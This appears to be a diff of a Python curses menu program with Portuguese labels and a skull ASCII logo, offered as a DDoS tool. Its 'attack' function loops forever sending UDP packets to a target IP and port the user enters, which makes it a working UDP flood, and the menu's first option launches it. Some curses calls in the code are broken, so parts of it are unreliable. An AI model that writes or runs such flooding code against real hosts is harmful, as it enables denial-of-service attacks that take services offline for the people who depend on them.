@@ -7,34 +7,52 @@ import os
 import subprocess
 import curses
 
-# Define TARGET
+
 TARGET = ""
 
-# Define logo
 LOGO = """
 
- ######  ######  
-     ##  #    #
-     ##  #    #
- #   ##  #    # 
-  ####   ######
+ ######   ####    ######   #### 
+     ##  #    #       ##  #    #
+     ##  #    #       ##  #    #
+ #   ##  #    #  #    ##  #    #   
+  ####    ####    #####    ####  
 
+███████████████████████████
+███████▀▀▀░░░░░░░▀▀▀███████
+████▀░░░░░░░░░░░░░░░░░▀████
+███│░░░░░░░░░░░░░░░░░░░│███
+██▌│░░░░░░░░░░░░░░░░░░░│▐██
+██░└┐░░░░░░░░░░░░░░░░░┌┘░██
+██░░└┐░░░░░░░░░░░░░░░┌┘░░██
+██░░┌┘▄▄▄▄▄░░░░░▄▄▄▄▄└┐░░██
+██▌░│██████▌░░░▐██████│░▐██
+███░│▐███▀▀░░▄░░▀▀███▌│░███
+██▀─┘░░░░░░░▐█▌░░░░░░░└─▀██
+██▄░░░▄▄▄▓░░▀█▀░░▓▄▄▄░░░▄██
+████▄─┘██▌░░░░░░░▐██└─▄████
+█████░░▐█─┬┬┬┬┬┬┬─█▌░░█████
+████▌░░░▀┬┼┼┼┼┼┼┼┬▀░░░▐████
+█████▄░░░└┴┴┴┴┴┴┴┘░░░▄█████
+███████▄░░░░░░░░░░░▄███████
+██████████▄▄▄▄▄▄▄██████████
+███████████████████████████
+   
 """
 
-# Define attack function
+
 def attack(target, port, message):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.sendto(message.encode(), (target, port))
 
-# Define curses window
+
 def main(stdscr):
     stdscr.clear()
     stdscr.addstr(0, (stdscr.cols // 2) - len(LOGO) // 2, LOGO)
     stdscr.addstr(stdscr.lines - 2, 0, "Use as setas para navegar e pressione Enter para selecionar uma opção")
     stdscr.refresh()
 
-    # Define options
     options = [
         ("Iniciar Ataque", "a"),
         ("Clonar Repositório", "c"),
@@ -42,21 +60,20 @@ def main(stdscr):
         ("Sair", "q")
     ]
 
-    # Define current option
+
     current_option = 0
 
-    # Main loop
+
     while True:
         key = stdscr.getkey()
 
-        # Handle keys
         if key == "KEY_UP" and current_option > 0:
             current_option -= 1
         elif key == "KEY_DOWN" and current_option < len(options) - 1:
             current_option += 1
         elif key == "ENTER":
             if options[current_option][1] == "a":
-                # Iniciar ataque
+
                 stdscr.clear()
                 stdscr.addstr(0, (stdscr.cols // 2) - 15, "Informe o alvo:")
                 stdscr.addstr(1, (stdscr.cols // 2) - 15, "IP/DOMÍNIO:")
@@ -74,7 +91,7 @@ def main(stdscr):
                 stdscr.getkey()
                 stdscr.clear()
             elif options[current_option][1] == "c":
-                # Clonar repositório
+
                 stdscr.clear()
                 stdscr.addstr(0, (stdscr.cols // 2) - 20, "Clonando repositório...")
                 stdscr.refresh()
@@ -83,7 +100,7 @@ def main(stdscr):
                 stdscr.getkey()
                 stdscr.clear()
             elif options[current_option][1] == "i":
-                # Instalar dependências
+
                 stdscr.clear()
                 stdscr.addstr(0, (stdscr.cols // 2) - 15, "Instalando dependências...")
                 stdscr.refresh()
@@ -92,14 +109,13 @@ def main(stdscr):
                 stdscr.getkey()
                 stdscr.clear()
             elif options[current_option][1] == "q":
-                # Sair
+
                 break
 
-        # Draw options
+
         stdscr.addstr(stdscr.lines // 2, (stdscr.cols // 2) - len(options[current_option][0]) // 2, options[current_option][0])
 
-        # Refresh window
+
         stdscr.refresh()
 
-# Initialize curses
 curses.wrapper(main)
